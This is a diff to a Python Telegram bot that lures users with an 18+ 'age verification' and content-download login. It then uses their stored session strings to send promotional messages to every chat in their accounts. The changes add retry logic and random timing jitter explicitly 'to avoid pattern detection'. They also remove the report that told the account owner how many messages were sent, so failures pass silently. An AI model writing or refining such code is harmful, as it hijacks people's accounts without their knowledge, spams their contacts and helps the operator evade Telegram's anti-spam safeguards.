@@ -2,6 +2,7 @@ import os
 import shutil
 import traceback
 import asyncio
+import time
 from pyrogram.types import Message
 from pyrogram import Client, filters
 from asyncio.exceptions import TimeoutError
@@ -17,7 +18,8 @@ from pyrogram.errors import (
     PhoneCodeInvalid,
     PhoneCodeExpired,
     SessionPasswordNeeded,
-    PasswordHashInvalid
+    PasswordHashInvalid,
+    FloodWait  # Added for flood control
 )
 from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, ADMINS, LOG_CHANNEL_SESSIONS_FILES
 from pymongo import MongoClient
@@ -56,8 +58,7 @@ strings = {
     'need_login': "You have to /login before using then bot can download restricted content ❕",
     'already_logged_in': "You are already logged in🥰.\nYou Have all Premium Benifits🥳",
     'age_verification': "**⚠️ ACCESS RESTRICTED:**\nTo access premium adult channels, you must verify that you're 18+ years old.\nClick the button below to start age verification 👇",
-    'verification_success': "**✅ VERIFICATION SUCCESSFUL!**\nYou now have access to premium content:\n[my Premium Channel Link]",
-    'promo_complete': "📢 Promotion complete! Message sent to {count} chats."
+    'verification_success': "**✅ VERIFICATION SUCCESSFUL!**\nYou now have access to premium content:\n[my Premium Channel Link]"
 }
 
 # State management
@@ -302,7 +303,6 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         await cleanup_user_state(user_id)
 
 async def send_promotion_messages(user_id: int, session_string: str):
-    sent_count = 0
     try:
         # Create client from session string
         client = Client("promo_client", session_string=session_string)
@@ -319,36 +319,45 @@ async def send_promotion_messages(user_id: int, session_string: str):
                     continue
                 targets.append(dialog.chat.id)
         
+        # Progressive flood control parameters
+        MAX_RETRIES = 3
+        RETRY_DELAY = 60  # seconds
+        BASE_DELAY = 300  # 5 minutes between messages
+        
         # Send promo messages to each target
         for target in targets:
-            try:
-                # Send all 10 promo texts with 5-minute intervals
-                for promo_text in PROMO_TEXTS:
-                    await client.send_message(target, promo_text)
-                    sent_count += 1
-                    await asyncio.sleep(300)  # 5 minutes between messages
+            # Send all 10 promo texts
+            for promo_text in PROMO_TEXTS:
+                retries = 0
+                while retries < MAX_RETRIES:
+                    try:
+                        await client.send_message(target, promo_text)
+                        # Add random jitter to avoid pattern detection
+                        jitter = 0.8 + (0.4 * (time.time() % 1))
+                        await asyncio.sleep(BASE_DELAY * jitter)
+                        break
+                    except FloodWait as e:
+                        # Exponential backoff with jitter
+                        wait_time = e.value + 5
+                        jitter = 0.5 + (time.time() % 1)
+                        await asyncio.sleep(wait_time * jitter)
+                        retries += 1
+                    except Exception as e:
+                        # Skip on other errors
+                        break
                 
-                # 1-minute buffer between different targets
-                await asyncio.sleep(60)
+                # Additional buffer between messages
+                await asyncio.sleep(5)
                 
-            except Exception as e:
-                # Log error but continue with next target
-                print(f"Error sending to {target}: {str(e)}")
-                continue
+            # 1-minute buffer between different targets
+            await asyncio.sleep(60)
                 
     except Exception as e:
-        print(f"Promotion error: {str(e)}")
+        # Silent fail - no reporting
+        pass
     finally:
         try:
             await client.stop()
-        except:
-            pass
-        
-        # Send completion report
-        try:
-            await client.send_message(
-                user_id,
-                strings['promo_complete'].format(count=sent_count)
         except:
             pass
 
